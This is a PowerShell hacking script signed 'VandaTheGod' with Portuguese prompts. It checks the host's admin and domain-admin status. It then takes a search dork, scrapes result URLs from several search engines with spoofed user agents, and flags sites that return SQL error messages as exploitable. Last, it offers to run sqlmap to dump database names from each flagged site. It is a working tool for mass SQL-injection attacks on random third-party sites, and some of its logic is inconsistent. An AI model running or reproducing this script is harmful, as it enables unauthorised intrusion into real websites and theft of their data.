$multiplelines = @"  
.__          _____     .___              _________                        
|__|______  /  |  |  __| _/____ ___  ___ \_   ___ \_______   ______  _  __
|  \_  __ \/   |  |_/ __ |/ __ \\  \/  / /    \  \/\_  __ \_/ __ \ \/ \/ /
|  ||  | \/    ^   / /_/ \  ___/ >    <  \     \____|  | \/\  ___/\     / 
|__||__|  \____   |\____ |\___  >__/\_ \  \______  /|__|    \___  >\/\_/  
               |__|     \/    \/      \/         \/             \/        
==========================================================================
"@
Write-Host $multiplelines -foregroundcolor red
write-host "                            Since 2002 - 2020" -foregroundColor red 
write-host "                                by VandaTheGod" -foregroundColor red 
write-host "                                            "


$h = hostname
$u = $env:UserName
$d = (Get-WmiObject -Class Win32_ComputerSystem).Domain

$sesh = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)


if ($sesh -eq "True"){

    $sessionadmin = "Admin Session"
    $tc = "Green"

    } else {

           $sessionadmin = "User Session"
           $tc = "Red"

           }



if ($d -eq "WORKGROUP"){

    $dom = "WORKGROUP" 
    $dtc = "Red"
    
    } else {

            $a = net group "domain admins" /domain

            $idom = select-string -pattern "$u" -InputObject $a

            if ($idom -eq $null){
            
                                  $dom =  "False"
                                  $dtc = "Red"
                                    
                                    } else {
                                    
                                            $dom = "True"
                                            $dtc = "Green"
                                            
                                            }

}


Write-Host "        Usuário: $u           |  Hostname: $h"

Write-Host "        Sessão: " -NoNewline ; Write-Host "$sessionadmin " -ForegroundColor $tc -NoNewline ; Write-Host "  |  Domain Admin: " -NoNewline ; Write-Host "$dom" -ForegroundColor $dtc

Write-Host ""


while($true){ 


$user = read-host "D0rk:"
write-host "---------------------------------------------------------------" -foregroundcolor yellow
write-host "Startando web crawler.... " -foregroundcolor yellow
write-host "---------------------------------------------------------------" -foregroundcolor yellow
$randei = -join ($Urls = Get-Random -InputObject Q,W,E,R,T,Y,U,I,O,P,A,S,D,F,G,H,J,K,L,Z,X,C,V,B,N,M,q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m -Count 22)
Start-Transcript -Path "check.txt" | out-null

write-host "---------------------------------------------------------------" -foregroundcolor yellow
$rdAgent = Get-Random -InputObject Chrome,FireFox,InternetExplorer,Opera,Safari
$userAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::"$rdAgent"

#======================qwant======================================================================================================
write-host "---------------------------------------------------------------" -foregroundcolor yellow
write-host "Procurando no qwant" -foregroundcolor red
write-host "---------------------------------------------------------------" -foregroundcolor yellow

$wordl = gc "offsets.txt"

#=====================BRAZIL SEARCH QWANT
foreach ($words in $wordl)
{

$rdAgent = Get-Random -InputObject Chrome,FireFox,InternetExplorer,Opera,Safari
$userAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::"$rdAgent"

$uri = "https://api.qwant.com/api/search/web?count=10&offset=$words&q=$user&t=web&device=desktop&safesearch=1&locale=pt_BR&uiv=4"

$Result = Invoke-RestMethod $uri -UserAgent $userAgent
$Result.data.result.items.url

}


#=====================USA SEARCH QWANT

foreach ($words in $wordl)
{

$rdAgent = Get-Random -InputObject Chrome,FireFox,InternetExplorer,Opera,Safari
$userAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::"$rdAgent"

$uri = "https://api.qwant.com/api/search/web?count=10&offset=$words&q=$user&t=web&device=desktop&safesearch=1&locale=en_US&uiv=4"

$Result = Invoke-RestMethod $uri -UserAgent $userAgent
$Result.data.result.items.url
}

#=====================Great Britain SEARCH QWANT
foreach ($words in $wordl)
{

$rdAgent = Get-Random -InputObject Chrome,FireFox,InternetExplorer,Opera,Safari
$userAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::"$rdAgent"

$uri = "https://api.qwant.com/api/search/web?count=10&offset=$words&q=$user&t=web&device=desktop&safesearch=1&locale=en_GB&uiv=4"

$Result = Invoke-RestMethod $uri -UserAgent $userAgent
$Result.data.result.items.url
}



#=================================================================================================================================
#==================exalead.com=====================================================================================================
write-host "---------------------------------------------------------------" -foregroundcolor yellow
write-host "Procurando no exalead" -foregroundcolor red
write-host "---------------------------------------------------------------" -foregroundcolor yellow

$HTMLex = iwr "http://www.exalead.com/search/web/results/?q=$user" -UserAgent $userAgent
($HTMLex.ParsedHtml.getElementsByTagName("a") | Where{ $_.className -eq "ellipsis"}).innerText

$HTMLex1 = iwr "http://www.exalead.com/search/web/results/?q=$user&elements_per_page=10&start_index=10" -UserAgent $userAgent
($HTMLex1.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'ellipsis'} ).innerText

$HTMLex2 = iwr "http://www.exalead.com/search/web/results/?q=$user&elements_per_page=10&start_index=20" -UserAgent $userAgent
($HTMLex2.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'ellipsis'} ).innerText

$HTMLex3 = iwr "http://www.exalead.com/search/web/results/?q=$user&elements_per_page=10&start_index=30" -UserAgent $userAgent
($HTMLex3.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'ellipsis'} ).innerText

$HTMLex4 = iwr "http://www.exalead.com/search/web/results/?q=$user&elements_per_page=10&start_index=40" -UserAgent $userAgent
($HTMLex4.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'ellipsis'} ).innerText

$HTMLex5 = iwr "http://www.exalead.com/search/web/results/?q=$user&elements_per_page=10&start_index=50" -UserAgent $userAgent
($HTMLex5.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'ellipsis'} ).innerText

$HTMLex6 = iwr "http://www.exalead.com/search/web/results/?q=$user&elements_per_page=10&start_index=60" -UserAgent $userAgent
($HTMLex6.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'ellipsis'} ).innerText

$HTMLex7 = iwr "http://www.exalead.com/search/web/results/?q=$user&elements_per_page=10&start_index=70" -UserAgent $userAgent
($HTMLex7.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'ellipsis'} ).innerText

#==================exalead.com=====================================================================================================
#==================acosia.com
$user2 = $user -replace '=' , '%3d'

write-host "--------------------" -foregroundcolor yellow
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
write-host "Procurando no ecosia.org" -foregroundcolor red
write-host "--------------------" -foregroundcolor yellow
$HTMLe = iwr  "https://www.ecosia.org/search?&q=$user2" 
($HTMLe.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'result-url js-result-url'} ).innerText 

$HTMLe1 = iwr -uri "https://www.ecosia.org/search?p=1&q=$user2" 
($HTMLe1.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'result-url js-result-url'} ).innerText

$HTMLe2 = iwr "https://www.ecosia.org/search?p=2&q=$user2" 
($HTMLe2.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'result-url js-result-url'} ).innerText

$HTMLe3 = iwr "https://www.ecosia.org/search?p=3&q=$user2" 
($HTMLe3.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'result-url js-result-url'} ).innerText

$HTMLe4 = iwr "https://www.ecosia.org/search?p=4&q=$user2" 
($HTMLe4.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'result-url js-result-url'} ).innerText

$HTMLe5 = iwr "https://www.ecosia.org/search?p=5&q=$user2" 
($HTMLe5.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'result-url js-result-url'} ).innerText

$HTMLe6 = iwr "https://www.ecosia.org/search?p=6&q=$user2" 
($HTMLe6.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'result-url js-result-url'} ).innerText

$HTMLe7 = iwr "https://www.ecosia.org/search?p=7&q=$user2" 
($HTMLe7.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'result-url js-result-url'} ).innerText
#==========================================================================================================================

write-host "--------------------" -foregroundcolor yellow
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
write-host "Procurando no ask.com" -foregroundcolor red
write-host "--------------------" -foregroundcolor yellow
$HTML11 = iwr "http://www.ask.com/web?q=$user2&o=0&qo=homepageSearchBox" 
($HTML11.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText

$HTML22 = iwr "https://www.ask.com/web?q=$user2&o=0&qo=pagination&qsrc=998&page=2" 
($HTML22.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText

$HTML33 = iwr "http://www.ask.com/web?q=$user2&o=0&qo=pagination&qsrc=998&page=3" 
($HTML33.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText

$HTML44 = iwr "http://www.ask.com/web?q=$user2&o=0&qo=pagination&qsrc=998&page=4" 
($HTML44.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText

$HTML55 = iwr "http://www.ask.com/web?q=$user2&o=0&qo=pagination&qsrc=998&page=5" 
($HTML55.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText

$HTML66 = iwr "http://www.ask.com/web?q=$user2&o=0&qo=pagination&qsrc=998&page=6" 
($HTML66.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText

$HTML77 = iwr "http://www.ask.com/web?q=$user2&o=0&qo=pagination&qsrc=998&page=7" 
($HTML77.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText


$HTML88 = iwr "http://www.ask.com/web?q=$user2&o=0&qo=pagination&qsrc=998&page=8" 
($HTML88.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText

$HTML99 = iwr "http://www.ask.com/web?q=$user2&o=0&qo=pagination&qsrc=998&page=9" 
($HTML99.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText

$HTML10 = iwr "http://www.ask.com/web?q=$user2&o=0&qo=pagination&qsrc=998&page=10" 
($HTML10.ParsedHtml.getElementsByTagName('p') | Where{ $_.className -eq 'PartialSearchResults-item-url'} ).innerText
Stop-Transcript | out-null

#=====================================================================================https://www.startpage.com/sp/search
write-host "--------------------" -foregroundcolor yellow
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
write-host "Procurando no startpage.com" -foregroundcolor red
write-host "--------------------" -foregroundcolor yellow
$postParams = "language=english&abp=-1&lui=english&pg=0&query=$user2&cat=web&page=1&sc=0elsCCC5mCrH00"


$getlinks = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams
($getlinks.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText

$postParams2 = "language=english&abp=-1&lui=english&pg=0&query=$user2&cat=web&page=2&sc=0elsCCC5mCrH00"


$getlinks2 = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams2
($getlinks2.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText

$postParams3 = "language=english&abp=-1&lui=english&pg=0&query=$user2&cat=web&page=3&sc=gigFUH7PUr2b00"


$getlinks3 = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams
($getlinks3.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText

$postParams4 = "language=english&lui=english&abp=-1&pg=0&query=$user2&cat=web&page=4&sc=TqCLPtXqbw6X00"


$getlinks4 = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams
($getlinks4.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText

$postParams5 = "pg=0&lui=english&abp=-1&language=english&query=$user2&cat=web&page=5&sc=O39UgRnbljYt00"


$getlinks5 = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams
($getlinks5.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText

$postParams6 = "language=english&abp=-1&lui=english&pg=0&query=$user2&cat=web&page=6&sc=QvzMl6TiA0EA00"


$getlinks6 = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams
($getlinks6.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText

$postParams7 = "language=english&abp=-1&lui=english&pg=0&query=$user2&cat=web&page=7&sc=0elsCCC5mCrH00"


$getlinks7 = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams
($getlinks7.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText

$postParams8 = "abp=-1&lui=english&pg=0&language=english&query=$user2&cat=web&page=8&sc=pDaZ9xFCkGyO00"


$getlinks8 = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams
($getlinks8.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText

$postParams9 = "abp=-1&lui=english&pg=0&language=english&query=$user2&cat=web&page=9&sc=fh0xWGLYSbIl00"


$getlinks9 = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams
($getlinks9.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText

$postParams10 = "abp=-1&lui=english&pg=0&language=english&query=$user2&cat=web&page=10&sc=CKM40PdovuCE00"


$getlinks10 = Invoke-WebRequest -Uri https://www.startpage.com/do/search -Method POST -Body $postParams
($getlinks10.ParsedHtml.getElementsByTagName('a') | Where{ $_.className -eq 'w-gl__result-url'} ).innerText
#========

$lines = Get-Content check.txt
$first = $lines[0]
$lines | where { $_ -ne $first } | Select-Object -skip 14 -first 198 | out-file check.txt
$duplicate = Get-Content check.txt | Select-Object -Unique ; $duplicate | out-file check.txt

$wordl = get-content 'check.txt'
write-host "starting vulnerability scan" -foregroundcolor Yellow
$ErrorActionPreference= 'silentlycontinue'
####################################################### rce wp 
foreach ($words in $wordl)
{

If (iwr "$words" | Select-String -Pattern "You have an error in your SQL syntax","80040e07","80040e14","Microsoft OLE DB Provider","Unclosed quotation mark","Query failed:","sql syntax" -CaseSensitive ){ 
write-host "[Exploitado!!! :)]" -foregroundcolor Red 
write-host "Host vulneravel $words" -foregroundcolor yellow
write-host "==================================================" -foregroundcolor Red
Add-Content -path "vull.txt" -value "$words[RCE_WP]"
Add-Content -path "rce.txt" -value "$words"
}
Else {
out-null
}
}


#==========================================exploit
$menu = @"
=================================================================
"Gostaria de exploitar os hosts? (Default is No)
(y/n)

[Q]= Quit

"@

$r = Read-Host $menu
Switch ($r) {
"y" {
$wordl2 = get-content 'sqli.txt'

foreach ($words2 in $wordl2)
{
write-host "====================================================================" -foregroundcolor Red
write-host "Pwn3d $words2" -foregroundcolor Yellow
write-host "====================================================================" -foregroundcolor Red
sqlmap3\sqlmap.py -u $words2 --batch --level 3 --dbs --no-cast --random-agent
}
}

"n" {
write-host "Quitting"
}

"Q" {
    Write-Host "Quitting" -ForegroundColor Red
}

default {
    Write-Host "error 404 script not found :p ." -ForegroundColor Yellow

} #fim?
}
       
    }


